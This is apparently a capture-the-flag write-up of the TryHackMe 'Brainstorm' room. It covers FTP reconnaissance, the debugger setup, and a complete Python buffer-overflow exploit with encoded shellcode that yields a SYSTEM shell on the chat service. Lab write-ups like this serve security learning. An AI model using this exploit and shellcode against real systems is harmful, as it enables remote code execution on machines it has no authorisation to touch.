# Brainstorm

## Recon
### Scan

This room is a bit challenging. The scan shows ftp (21) and some chat client (9999). I only see these two, but apparently there are 6. Must be some UDP ports I missed.

### Explore the services

#### FTP
Anonymous login is allowed. I logged in with user `ftp` and pass `ftp` but kept hitting an error about **Extended Passive Mode.**. I did some reasearch to refresh my memory on what this was.
```bash
ftp 10.10.109.7
Connected to 10.10.109.7.
220 Microsoft FTP Service
Name (10.10.109.7:nate): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49356|) 
```

Long story short, you need to force active mode since passive mode is failing. I spent a lot of time googling this error and reading about how to fix it. But the answer was right in the damn man page; need to force active mode with the `-A` flag.

```bash
ftp 10.10.109.7 -A                                                      
Connected to 10.10.109.7.                                                                                      
220 Microsoft FTP Service
Name (10.10.109.7:nate): ftp                                                                                   
331 Anonymous access allowed, send identity (e-mail name) as password.                                         
Password:                                                                                                      
230 User logged in.                                                                                            
Remote system type is Windows_NT.                                                                              
ftp> ls                                                                                                        
200 EPRT command successful.
150 Opening ASCII mode data connection.
08-29-19  07:36PM       <DIR>          chatserver
226 Transfer complete.
```

Great, it's working now and I see a folder.

```bash
ftp> cd chatserver
250 CWD command successful. 
ftp> ls
200 EPRT command successful.
150 Opening ASCII mode data connection.
08-29-19  09:26PM                43747 chatserver.exe
08-29-19  09:27PM                30761 essfunc.dll
226 Transfer complete.
```

Find `chatserver.exe` and download it for later.

```bash
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
150 Opening ASCII mode data connection.
100% |******************************************************************| 43747       43.33 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
43747 bytes received in 00:00 (43.31 KiB/s)
```

Crap, I've ran into this before. Need to use `binary` to transfer executables.

```bash
ftp> binary
200 Type set to I.
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |******************************************************************| 43747       43.87 KiB/s    00:00 ETA
226 Transfer complete.
```

## Exploit Development
### Setting up the Dev environment

#### Setting up the sandbox

Now I'll set up a Windows Dev environment in Windows Sandbox (I don't want to run this executable on my PC.)

It appears to be working. Will not have to to do anything crafty with the network.

![[Pasted image 20220210233944.png]]

#### Immunity and python

Then install immunity, which also installs python. The python installer failed the first time around so I selected "Install just for this user" the second time around. Not sure if it was coincidence or lucky guess but it worked. Lets get crackin!

Actually immunity wouldn't boot as it coulnd't find the python files. So I'm moving this project to a dev version of Windows 11 I have installed in the lab. It'll be a good first look at Windows 11 anyways. EDIT: Turns out it had nothing to do with the sandbox. It's possible this would have worked if I did all the below fixes, but everything is lost from a sandbox when the session is closed. It's probably better to use a VM anyways so I can maintain the debugging environment.

I was able to get everything working in Windows 11. Had to configure Windows firewall to allow port 9999 though.

Everything is working!

![[Pasted image 20220211005230.png]]

Seems like the overflow will be in the username. Lets fire up the tool.

#### Mona

Looks like I spoke too soon about everything working. I got an error when trying to run a `!mona` command.

> pycommands: error importing module

I see online this error is from using the 64-bit python and using a 32bit version should fix it. So...reinstall python with x86 version.

Also, I need to install [mona](https://github.com/corelan/mona). Wow, setting up this environment is a PITA - it was nice having a box ready on TryHackMe for the other challenges. I'll have to save this setup.

Another issue - since the file was downloaded from the internet, it has to be marked as safe in the file properties before it can be used.

![[Pasted image 20220211015656.png]]

Another issue I ran into was the `mona.py` file was full of HTML as I downloaded it incorrectly. Found that [here on github](https://github.com/corelan/mona/issues/15)

#### I never want to go through this again

IT WORKS!!!!

Getting a snapshot...

### Develop the exploit

I used the buffer overflow helper script I made and got this box done MUCH quicker than I was able to get the DEV environment set up. 
![[Pasted image 20220211021145.png]]

I never turned off Windows AV module so I only had access for a bit before getting kicked.

![[Pasted image 20220211021322.png]]

The completed POC exploit is as follows:

```python3
#!/usr/bin/env python3

import socket

ip = "192.168.1.104"
port = 9999

prefix = " "
offset = 6107
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16
payload = "\xbd\xcf\xbb\xca\x95\xdb\xc2\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\x27\x47\x28\x60\x4b\x50\x2f\x8b\xb3\xa1\x50\x05\x56\x90\x50\x71\x13\x83\x60\xf1\x71\x28\x0a\x57\x61\xbb\x7e\x70\x86\x0c\x34\xa6\xa9\x8d\x65\x9a\xa8\x0d\x74\xcf\x0a\x2f\xb7\x02\x4b\x68\xaa\xef\x19\x21\xa0\x42\x8d\x46\xfc\x5e\x26\x14\x10\xe7\xdb\xed\x13\xc6\x4a\x65\x4a\xc8\x6d\xaa\xe6\x41\x75\xaf\xc3\x18\x0e\x1b\xbf\x9a\xc6\x55\x40\x30\x27\x5a\xb3\x48\x60\x5d\x2c\x3f\x98\x9d\xd1\x38\x5f\xdf\x0d\xcc\x7b\x47\xc5\x76\xa7\x79\x0a\xe0\x2c\x75\xe7\x66\x6a\x9a\xf6\xab\x01\xa6\x73\x4a\xc5\x2e\xc7\x69\xc1\x6b\x93\x10\x50\xd6\x72\x2c\x82\xb9\x2b\x88\xc9\x54\x3f\xa1\x90\x30\x8c\x88\x2a\xc1\x9a\x9b\x59\xf3\x05\x30\xf5\xbf\xce\x9e\x02\xbf\xe4\x67\x9c\x3e\x07\x98\xb5\x84\x53\xc8\xad\x2d\xdc\x83\x2d\xd1\x09\x03\x7d\x7d\xe2\xe4\x2d\x3d\x52\x8d\x27\xb2\x8d\xad\x48\x18\xa6\x44\xb3\xcb\x09\x30\xba\x7b\xe2\x43\xbc\x6a\xae\xca\x5a\xe6\x5e\x9b\xf5\x9f\xc7\x86\x8d\x3e\x07\x1d\xe8\x01\x83\x92\x0d\xcf\x64\xde\x1d\xb8\x84\x95\x7f\x6f\x9a\x03\x17\xf3\x09\xc8\xe7\x7a\x32\x47\xb0\x2b\x84\x9e\x54\xc6\xbf\x08\x4a\x1b\x59\x72\xce\xc0\x9a\x7d\xcf\x85\xa7\x59\xdf\x53\x27\xe6\x8b\x0b\x7e\xb0\x65\xea\x28\x72\xdf\xa4\x87\xdc\xb7\x31\xe4\xde\xc1\x3d\x21\xa9\x2d\x8f\x9c\xec\x52\x20\x49\xf9\x2b\x5c\xe9\x06\xe6\xe4\x09\xe5\x22\x11\xa2\xb0\xa7\x98\xaf\x42\x12\xde\xc9\xc0\x96\x9f\x2d\xd8\xd3\x9a\x6a\x5e\x08\xd7\xe3\x0b\x2e\x44\x03\x1e;"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
```


## Exploit the target

Now to swap out the payload (line 15) and the RHOST IP (line 5).

Time to test the exploit.

Nice, I got a system shell!

![[Pasted image 20220211023245.png]]